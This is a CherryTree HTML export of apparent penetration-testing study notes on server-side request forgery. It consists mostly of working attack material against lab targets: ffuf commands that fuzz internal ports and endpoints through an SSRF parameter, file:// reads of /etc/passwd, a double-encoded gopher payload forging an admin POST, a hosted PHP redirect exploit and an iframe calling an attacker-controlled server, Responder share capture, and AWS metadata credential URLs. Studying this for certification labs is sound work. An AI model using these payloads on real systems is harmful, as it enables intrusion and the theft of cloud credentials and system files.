<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>25- SSRF</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>25- SSRF</h1><br/><p><h2> Methodology</h2><ul><li>coerce the attacker to make requests to arbitrary urls supplied by attacker <ul><li>if additionaly the attacker controls protocol/URL scheme this might lead to more impact e.g rce/file discovery <ul><li>file:// </li><li>gopher:// # used to send HTTP POST requests or comunicate with other services such as SMTP or databases </li></ul></li></ul></li></ul></p><p><h2>Exploit normal SSRF</h2></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">seq</span> 1 10000 <span style="color:#ff9d00;font-weight:700">&gt;</span> ports.txt<br /><span style="color:#0088ff;font-weight:400"># enumerate ports</span><br />ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H <span style="color:#3ad900;font-weight:400">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -d <span style="color:#3ad900;font-weight:400">&quot;dateserver=http://127.0.0.1:FUZZ/&amp;date=2024-01-01&quot;</span> -fr <span style="color:#3ad900;font-weight:400">&quot;Failed to connect to&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400"># enumerate restricted endpoints</span><br />ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u<br />http:<span style="color:#ff9d00;font-weight:700">//</span>172.17.0.2<span style="color:#ff9d00;font-weight:700">/</span>index.php -X POST -H <span style="color:#3ad900;font-weight:400">&quot;Content-Type: application/x-wwwform-<br />urlencoded&quot;</span> -d <span style="color:#3ad900;font-weight:400">&quot;dateserver=http://dateserver.htb/FUZZ.php&amp;date=2024-<br />01-01&quot;</span> -fr <span style="color:#3ad900;font-weight:400">&quot;Server at dateserver.htb Port 80&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400"># LFI</span><br />file:<span style="color:#ff9d00;font-weight:700">//</span>etc<span style="color:#ff9d00;font-weight:700">/</span>passwd<br /><br /><span style="color:#0088ff;font-weight:400"># gopher for POST request</span><br /><span style="color:#0088ff;font-weight:400">## we need to url encode all special chars and then encode the entire url again</span><br /><span style="color:#0088ff;font-weight:400">### %20 space ; %0D%0A NewLine </span><br /><span style="color:#7f0044;font-weight:400">dateserver</span>=gopher%3a<span style="color:#ff9d00;font-weight:700">//</span>dateserver.htb%3a80<span style="color:#ff9d00;font-weight:700">/</span>_POST%2520<span style="color:#ff9d00;font-weight:700">/</span>admin.php%2520HTTP%25<br />2F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-<br />Length%3a%252013%250D%250AContent-Type%3a%2520application<span style="color:#ff9d00;font-weight:700">/</span>x-www-formurlencoded%<br />250D%250A%250D%250Aadminpw%253Dadmin<span style="color:#ff9d00;font-weight:700">&amp;</span><span style="color:#7f0044;font-weight:400">date</span>=2024-01-01<br /><br /><span style="color:#0088ff;font-weight:400"># gopher other protocols </span><br />git clone https://github.com/tarunkant/Gopherus</pre></div></p><p></p><p></p><p><h2>SSRF to LFI </h2><ul><li>if file:// doesn&#39;t work</li><li>host exploit.php<ul><li> &lt;?php  header(&#39;Location: file:///etc/passwd&#39;); ?&gt;</li><li>&lt;?php</li></ul></li></ul></p><p>header(&#39;Location: file:///Windows/win.ini&#39;);</p><p>?&gt;</p><p><ul><li>exploit<ul><li>php -S 0.0.0.0:9001</li><li>$lhost:9001/index.php</li><li>&lt;iframe width=&quot;1000&quot; &quot;height=&quot;1000&quot; src=&quot;http://192.168.45.238:9001/test.php?path=/etc/passwd&quot;/&gt;</li></ul></li><li>on windows<ul><li>responder</li><li>\\$lhost\share</li></ul></li></ul></p><p></p><p></p><p><h2>AWS instance</h2><ul><li>http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance // secret data</li><li>other metadata<ul><li>http://169.254.169.254/latest/meta-data/hostname</li><li>http://169.254.169.254/latest/meta-data/instance-id</li><li>http://169.254.169.254/latest/meta-data/network-config</li><li>http://169.254.169.254/latest/meta-data/network-sysconfig</li><li>http://169.254.169.254/latest/meta-data/public-keys</li><li><a href="http://169.254.169.254/latest/meta-data/vendor_data">http://169.254.169.254/latest/meta-data/vendor_data</a></li></ul></li></ul></p><p></p><p></p><p></p><p><h2>LFI interesting files</h2><ul><li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html">https://sushant747.gitbooks.io/total-o-guide/content/local_file_inclusion.html</a></li><li></li></ul></p></div>
</body>
</html>
